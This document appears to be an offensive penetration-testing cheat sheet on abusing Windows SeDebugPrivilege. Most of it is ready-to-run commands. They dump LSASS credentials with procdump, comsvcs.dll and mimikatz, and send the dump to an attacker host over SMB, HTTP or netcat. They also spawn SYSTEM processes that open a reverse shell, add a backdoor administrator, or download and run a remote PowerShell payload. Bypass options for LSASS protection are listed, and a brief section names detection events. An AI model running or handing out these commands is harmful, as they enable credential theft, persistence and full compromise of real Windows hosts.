## SeDebugPrivilege

`SeDebugPrivilege` grants a process the ability to open a handle to any other process or thread on the system, bypassing all security descriptor checks. It is assigned to administrators by default but is sometimes deliberately granted to developers or power users, making it a high-value target when hunting for non-obvious privilege paths during an assessment. 

***

## Confirming the Privilege

```cmd
:: Must run from an elevated session
whoami /priv | findstr "SeDebugPrivilege"

:: Full token view
whoami /priv

:: If SeDebugPrivilege shows Disabled, it is still assigned - it can be enabled
:: Windows does not let you enable it with a built-in command
```

Even when listed as `Disabled`, the privilege is in the token and most exploit tools will activate it automatically before use. 

***

## Path 1: LSASS Credential Dump

LSASS holds plaintext credentials, NTLM hashes, and Kerberos tickets in memory for every user with an active session on the host. Dumping it with `SeDebugPrivilege` is the most direct credential extraction path on Windows. 
### Method 1: ProcDump (Sysinternals)

```cmd
:: Dump full LSASS memory to disk
procdump.exe -accepteula -ma lsass.exe lsass.dmp

:: If procdump is blocked by AV, specify PID directly
tasklist | findstr lsass
procdump.exe -accepteula -ma <lsass_pid> lsass.dmp

:: Dump to a specific path
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

### Method 2: Task Manager (GUI - No Tools Required)

```
1. Open Task Manager
2. Click Details tab
3. Right-click lsass.exe
4. Select "Create dump file"
5. File is saved to C:\Users\<username>\AppData\Local\Temp\lsass.DMP
```

### Method 3: comsvcs.dll via rundll32 (LOLBin - No External Tools)

```powershell
# Get LSASS PID
$pid = (Get-Process lsass).Id

# Dump using built-in Windows DLL
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full

# Single cmd.exe line
for /f "tokens=1,2 delims= " %A in ('"tasklist /fi "Imagename eq lsass.exe" /NH"') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %B C:\Windows\Temp\lsass.dmp full
```

### Method 4: Mimikatz Direct (Live)

```cmd
:: If running directly on the box with SeDebugPrivilege active
mimikatz.exe

mimikatz # log
:: Creates mimikatz.log in current directory - always do this first

mimikatz # privilege::debug
:: Enables SeDebugPrivilege if it is currently Disabled
:: Output: Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
:: Directly reads live LSASS memory
:: No dump file needed
```

***

## Processing the Dump Offline

Transfer `lsass.dmp` to your attack machine, then extract credentials without touching the target again: 

```cmd
:: On attack machine, open Mimikatz
mimikatz.exe

mimikatz # log
:: Always log output - dumps from servers may contain 50+ sets of credentials

mimikatz # sekurlsa::minidump lsass.dmp
:: Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
:: Extracts NTLM hashes, plaintext passwords if WDigest is enabled, Kerberos tickets

:: What you get:
:: Username, Domain, NTLM hash -> use for pass-the-hash
:: Plaintext password (if WDigest enabled or old OS) -> use directly
:: Kerberos tickets -> use for pass-the-ticket
```

### Transferring the Dump File

```bash
# Option 1: SMB server on attack machine
impacket-smbserver share . -smb2support
# On target:
copy C:\Windows\Temp\lsass.dmp \\10.10.14.3\share\lsass.dmp

# Option 2: Python HTTP server
# On attack machine:
python3 -m http.server 8080
# On target (PowerShell):
Invoke-WebRequest -Uri http://10.10.14.3:8080 -Method PUT -InFile C:\Windows\Temp\lsass.dmp

# Option 3: nc.exe
# On attack machine:
nc -lnvp 9001 > lsass.dmp
# On target:
nc.exe 10.10.14.3 9001 < C:\Windows\Temp\lsass.dmp
```

***

## Path 2: RCE as SYSTEM via Parent Process Impersonation

`SeDebugPrivilege` also allows a process to open a handle to any SYSTEM process and spawn a child under it, inheriting the SYSTEM token. This is useful when LSASS dumping is monitored or yields no useful credentials. 

### Using psgetsystem (Updated Method)

```powershell
# Step 1: Transfer the script
certutil -urlcache -split -f http://10.10.14.3/psgetsys.ps1 psgetsys.ps1

# Step 2: Import it
Import-Module .\psgetsys.ps1
# Or dot-source it:
. .\psgetsys.ps1

# Step 3: Find a SYSTEM-level process PID
tasklist | findstr "winlogon\|lsass\|wininit"
# winlogon.exe  612
# lsass.exe     672
# wininit.exe   548

# Or use PowerShell to get PID directly
(Get-Process winlogon).Id
(Get-Process lsass).Id

# Step 4a: Spawn an interactive SYSTEM shell (if you have a GUI session)
ImpersonateFromParentPid -ppid 612 -command "C:\Windows\System32\cmd.exe" -cmdargs ""

# Step 4b: Reverse shell as SYSTEM (non-interactive session)
ImpersonateFromParentPid -ppid 612 -command "C:\Windows\System32\cmd.exe" -cmdargs "/c C:\tools\nc.exe 10.10.14.3 8443 -e cmd"

# Step 4c: Add a backdoor admin user as SYSTEM
ImpersonateFromParentPid -ppid 612 -command "C:\Windows\System32\cmd.exe" -cmdargs "/c net user hacker Pass1! /add && net localgroup Administrators hacker /add"

# Step 4d: Using base64-encoded PowerShell payload (avoid special character issues)
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3/shell.ps1')"
$b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
ImpersonateFromParentPid -ppid 612 -command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -cmdargs "-enc $b64"
```

### Older psgetsys Syntax (Legacy Usage)

```powershell
# Some versions use the static method syntax
. .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent(612, "C:\Windows\System32\cmd.exe", "")
# Note: the empty third argument "" is required for the PoC to function
```

***

## LSASS Protection Awareness

Modern environments may have LSASS hardening in place that blocks straightforward memory access. 
```powershell
# Check if RunAsPPL (LSASS as Protected Process Light) is enabled
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
# Value of 1 = PPL enabled, standard dump methods fail

# Check if Credential Guard is enabled
reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v LsaCfgFlags
# Value of 1 or 2 = Credential Guard active, NTLM hashes and cleartext passwords not stored in LSASS

# If PPL is active, options include:
# - PPLdump.exe (exploits a PPL bypass vulnerability)
# - Mimidrv kernel driver (loads a driver to remove PPL protection)
# - MalSecLogon (exploits CreateProcessWithLogonW to bypass PPL)
```

***

## Detection Events to Know

For defenders and for understanding what to avoid triggering: 
```
Event ID 4656: Handle to LSASS requested
  -> Generated when any process requests an open handle to LSASS
  -> Alert if source process is not a trusted AV/EDR agent

Event ID 10 (Sysmon): Process access
  -> Logs any process opening a handle to LSASS
  -> TargetImage: lsass.exe, GrantedAccess: 0x1FFFFF = full access = alert immediately

Event ID 4672: SeDebugPrivilege in new logon token
  -> Fires when account with SeDebugPrivilege logs on
  -> Should only ever be seen for administrator accounts
```

***

## Full Attack Decision Flow

```
SeDebugPrivilege found
         |
         v
Goal: Credentials or SYSTEM shell?
         |
    _____|_____
    |          |
Credentials   SYSTEM shell
    |          |
    v          v
Dump LSASS   Use psgetsys
    |         ImpersonateFromParentPid
    v         targeting winlogon PID
Method:
1. procdump -ma lsass.exe lsass.dmp  (most reliable)
2. rundll32 comsvcs.dll MiniDump     (no external tools)
3. Task Manager dump                  (GUI only)
    |
    v
Transfer dump to attack machine
    |
    v
mimikatz sekurlsa::minidump + sekurlsa::logonpasswords
    |
    v
NTLM hash -> Pass-the-Hash (evil-winrm, psexec, crackmapexec)
Cleartext  -> Direct use
Kerberos   -> Pass-the-Ticket
```
